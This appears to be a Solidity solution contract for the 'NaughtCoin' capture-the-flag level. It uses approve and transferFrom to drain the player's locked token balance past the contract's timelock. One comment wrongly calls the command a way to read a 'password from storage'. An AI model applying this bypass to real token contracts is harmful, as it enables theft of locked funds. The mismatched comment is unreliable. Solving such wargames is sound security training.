// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/INaughtCoin.sol";

contract NaughtCoinAttack {
    /**
     * @dev To get password from storage, you can run this script in client side:
     * > await contract.approve(<NaughtCoinAttack_CONTRACT_ADDRESS>, await contract.balanceOf(player))
     */
    function attack(INaughtCoin target) external {
        require(
            target.transferFrom(msg.sender, address(this), target.balanceOf(msg.sender)) &&
                0 == target.balanceOf(msg.sender),
            "NaughtCoin: Attack failed"
        );
    }
}
